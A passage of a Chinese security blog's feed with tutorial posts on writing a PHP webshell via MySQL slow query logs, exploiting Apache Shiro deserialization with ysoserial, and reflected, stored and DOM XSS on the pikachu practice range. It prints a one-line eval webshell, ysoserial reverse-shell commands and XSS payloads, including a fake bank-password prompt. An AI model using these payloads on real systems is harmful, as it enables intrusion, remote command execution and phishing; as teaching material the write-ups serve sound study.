src="https://img-blog.csdnimg.cn/0c157e9b78d94f558fa2810fb9b612c6.png" alt="在这里插入图片描述"></li></ol><p>   开启慢查询日志并修改日志文件的绝对路径  </p><p>   <img src="https://img-blog.csdnimg.cn/c39b3347745f4fab952e9f2d5e227e03.png" alt="在这里插入图片描述"></p><p>   使用慢查询日志时，只有当查询时间超过系统时间时才会记录在日志中 </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询mysql系统时间 show global variables like <span class="string">&#x27;%long_query_time%&#x27;</span>;  </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/373a27b72f2842daa1068ddf60dba949.png" alt="在这里插入图片描述"></p><p>   向日志中写入shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> or <span class="built_in">sleep</span>(<span class="number">11</span>);设置查询时间为<span class="number">11</span>s</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/73414b3a6c5446c79613d1ec565f66be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   执行成功<br>     <img src="https://img-blog.csdnimg.cn/7aa6d66c6eff48df85d9b006f8617c02.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   蚁剑连接成功</p><ol start="5"><li>phpMyAdmin文件包含漏洞<br>CVE-2018-19968<br>CVE-2018-12613<br>CVE-2016-5734<br>CVE-2014-8959</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Mysql写shell的几种方式&quot;&gt;&lt;a href=&quot;#Mysql写shell的几种方式&quot; class=&quot;headerlink&quot; title=&quot;Mysql写shell的几种方式&quot;&gt;&lt;/a&gt;&lt;strong&gt;Mysql写shell的几种方式&lt;/strong&gt;&lt;/h2&gt;</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="sql注入" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="sql注入" scheme="https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="mysql" scheme="https://redredredfish.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>shiro反序列化的初级理解</title>
    <link href="https://redredredfish.github.io/2021/07/06/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://redredredfish.github.io/2021/07/06/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-07-06T02:37:00.000Z</published>
    <updated>2021-12-06T03:09:26.034Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shiro反序列化原理"><a href="#shiro反序列化原理" class="headerlink" title="shiro反序列化原理"></a>shiro反序列化原理</h2><p><strong>rememberMe功能：</strong><br>shiro框架提供了rememberMe功能，这个功能大概是用户登录成功后会生成一个凭证组，shiro将它经过序列化-&gt;AES加密-&gt;Base64加密得到一串数据流传回给cookie，下次登录时，shiro通过Base64解码-&gt;AES解密-&gt;反序列化验证cookie中的rememberMe包含的凭证组是否正确，从而实现“下次登录记住我”的功能。</p><p>  <strong>漏洞原理：</strong><br>造成shiro反序列化漏洞的关键点，一个是Shiro&lt;1.2.4中，AES-CBC加解密时key默认为硬编码，只要能获取到这个key就可以构造恶意数据让shiro识别为正常数据；另一个点是shiro在验证rememberMe时使用了readObject方法，readObject用来执行反序列化后需要执行的代码片段，从而造成恶意命令可以被执行。</p><p>  <strong>漏洞利用：</strong></p><ol><li>首先需要获取正确的key值，利用shiro接收错误rememberMe会抛出异常返回Set-Cookie的特性，可以通过爆破，直到响应头中不包含Set-Cookie，说明key成功匹配。</li><li>接着需要对恶意数据进行序列化，shiro序列化对象只有继承PrincipalCollection时，类型转换才正常，不然会抛出异常，这里可以借助ysoserial生成序列化数据：<br>利用ysoserial中的JRMP监听模块进行反弹shell，需使用Java Runtime 配合 bash 编码 java -cp</li><li>ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 监听端口<br>CommonsCollections4 ‘bash编码’ 利用ysoserial生成.ser文件 java -jar<br>ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 “命令” &gt; x.ser</li><li>然后进行AES加密、Base64加密，伪造cookie，执行命令</li></ol><h2 id="如何判断一个网站是否使用了shiro框架"><a href="#如何判断一个网站是否使用了shiro框架" class="headerlink" title="如何判断一个网站是否使用了shiro框架"></a>如何判断一个网站是否使用了shiro框架</h2><p>在请求包中的cookie字段添加rememberMe=xxx,查看响应头中是否包含rememberMe=deleteMe值<br>例如：<br><img src="https://img-blog.csdnimg.cn/5a2a09b4e61442c199210cddbfcda914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;shiro反序列化原理&quot;&gt;&lt;a href=&quot;#shiro反序列化原理&quot; class=&quot;headerlink&quot; title=&quot;shiro反序列化原理&quot;&gt;&lt;/a&gt;shiro反序列化原理&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;rememberMe功能：&lt;/strong&gt;&lt;br&gt;</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="反序列化漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="shiro反序列化" scheme="https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="反序列化漏洞" scheme="https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XSS基础(一)</title>
    <link href="https://redredredfish.github.io/2021/06/15/XSS%E5%9F%BA%E7%A1%80-%E4%B8%80/"/>
    <id>https://redredredfish.github.io/2021/06/15/XSS%E5%9F%BA%E7%A1%80-%E4%B8%80/</id>
    <published>2021-06-15T02:33:00.000Z</published>
    <updated>2021-12-06T03:11:09.337Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p>其实我一直不太理解为啥反射型XSS在报告里常年作为高危漏洞，虽然说渗透学习的终点是钓鱼，但是实际工作中遇到真正能利用的其实并不多，而且这玩意有时候参数多修起来比较麻烦，心疼甲方开发三秒。</p><p>不管了先看看百度是咋解释的：</p><blockquote><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p></blockquote><p>说的简单点，跨站脚本攻击是指攻击者往Web页面里插入恶意代码，当用户浏览时，代码会被执行，最简单的弹弹窗搞搞心态钓钓鱼啥的，当然不止xss的利用不止于此。<br>所以造成xss的关键是<strong>用户的输入未过滤直接输出</strong>。</p><h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><blockquote><p>XSS的类型常见的总共有三种，反射型、存储型、DOM型</p></blockquote><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><ul><li><p>反射型XSS是最常见也是最容易验证的类型，和存储型的区别是恶意代码不存储在服务端只做交互，插入什么就输出什么，根据俺的经验，一般在无害化漏洞扫描器中扫出的XSS都是反射型XSS漏洞 。关于如何交互可以看下面这张图。<br><img src="https://img-blog.csdnimg.cn/0fc28d70a38b42fcadd44ec13764abee.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p></li><li><p>造成此类漏洞的弱点参数普遍存在于URL中，在测试中可以重点关注某些可以人为控制的参数，特别是会反映在前端的参数。</p></li><li><p>反射型最简单的payload就是弹窗验证，即<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>,<code>&lt;script&gt;</code> 标签用于在前端插入JS代码，<code>alert()</code>函数用于显示带内容的弹窗。</p></li><li><p>关于get反射和post反射，简单理解就是get型参数是你能在url里找到的，post一般在流量包里url里是看不见的，这玩意深入下去就要涉及到TCP/IP那一套了，我这种最低级的安服仔肯定不会，可以看看<a href="https://www.cnblogs.com/logsharing/p/8448446.html">这位大佬的解释</a>。</p></li><li><p>下面拿pikachu靶场举例：</p></li></ul><p>谁是你最喜欢的NBA球员，当然是库里啦的(￣︶￣*))<br><img src="https://img-blog.csdnimg.cn/c0334bfcc7384921a42ed75fd2d787ef.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_13,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>试一下payload： </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> code = prompt(<span class="string">&quot;请输入你的银行卡密码：&quot;</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/06506384c00745fe972f3f524135ea47.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>可以看到弹窗了，重点关注这个URL，可见我们输入的参数被URL编码后带在里面，试想如果有人拿这个低级链接来🎣，没有安全常识的甲方爸爸确实有可能会上钩，这时候危害性就体现出来了。</p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ul><li>首先提一下，当你怀疑有存储型XSS的时候千万要先在burpsuite里重放试试，之前有一次渗透，在客户的OA里发现了一个存储型XSS，手贱存了个弹窗代码，导致整个前端格式崩溃浏览器无法渲染，最后在服务器数据库里摸了半天才找到，好端端的渗透干成应急了，血淋淋的教训😭</li><li>由上述低级事故可知存储型XSS实际的危害还是蛮大的，顾名思义存储型XSS就是将恶意代码存在服务端或者数据库，一般这种漏洞在留言、添加数据这种功能点出现的比较多，当用户去访问被存入恶意代码的页面时，恶意代码就会执行。</li><li>还是拿pikachu来举例：</li></ul><p> 还是一样在留言功能点存一个弹窗payload进去。<br> <img src="https://img-blog.csdnimg.cn/7827ff74032b451ea9d2d5faffd89d3a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li>可以看到每次进这个页面都会弹窗。</li><li>原因是我们写入的恶意代码已经被存到了后台，当我们每次打开页面，展示留言功能就会从后台数据库里读取到这段恶意代码并交给浏览器渲染输出。</li><li>确实挺搞人心态的的┗|｀O′|┛ 。</li></ul><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><ul><li>感觉DOM型基本没遇到过，也可能是我太菜了没注意过。</li><li>首先啥是DOM?其实就是纯前端的参数接口，有了这个可以控制前端参数做动态网页但不和后端做数据交互。</li><li>所以DOM型XSS实际上是由于前端的参数人为可控造成的</li><li>看看pikachu中的DOM型XSS:<br><img src="https://img-blog.csdnimg.cn/b17c6ea4733b4e4a9083d5ea4c40c187.png" alt="在这里插入图片描述"><br>提交功能点的JS代码是这样写的。<br>大概就是输入一个网址，然后点一下what do you see?这句话就能跳转过去。<br>显然这个str参数是我们可控的，因为在前端处理数据，那我们可以想办法让它变成恶意代码，反正浏览器只管渲染不会管语句是不是恶意。<br>看一下pikachu提供的两个payload：</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//试试：&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span><br></pre></td></tr></table></figure><p>第一个,<code>&lt;img&gt;</code>标签代表图片，<code>onmouseover</code>代表鼠标滑过事件，所以就是鼠标滑过这张图片就执行<code>alert(&#39;xss&#39;)</code>弹个窗<br>第二个差不多，<code>onclick</code>代表鼠标点击事件<br>为啥它说闭合掉就行？</p><p>可以把payload带进那句代码看看：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&quot;+&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>+&quot;&#x27;&gt;what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;;</span><br></pre></td></tr></table></figure><p>这样一看<code>&quot;&lt;a href=&#39; &quot;+&#39;&gt;</code>这段实际上<code>&quot;+</code>被当作了<code>&lt;a&gt;</code>标签的链接参数，显然这个标签就没用了<br>后面<code>&quot; &#39;&gt;what do you see?&lt;/a&gt;&quot;</code>就是个字符串<br>所以留下的有用的就只有<code>&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;</code>，这样改一改就又能拿来🎣了。</p><p>在复杂的网页环境中，会大量用到这种闭合技巧，需要结合F12或猜标签的形式来构造payload。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>反射型和存储型都会和服务端交互，DOM型则是纯前端。</li><li>反射型不会存在服务端或者数据库，服务端只会把收到的URL原封不动还给浏览器渲染。</li><li>判断是存储型还是反射型，只要看提交一次弹窗payload再刷新页面，不弹就是反射型，还弹就是存储型。</li><li>判断是反射型还是DOM型，只要在F12里找有没有处理参数的代码，没有就是反射型，有就是DOM型。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;h2 id=&quot;什么是XSS&quot;&gt;&lt;a href=&quot;#什么是XSS&quot; class=&quot;headerlink&quot; title=&quot;什么是XSS&quot;&gt;&lt;/a&gt;什</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="XSS" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/XSS/"/>
    
    
    <category term="XSS" scheme="https://redredredfish.github.io/tags/XSS/"/>
    
  </entry>
  
</feed>
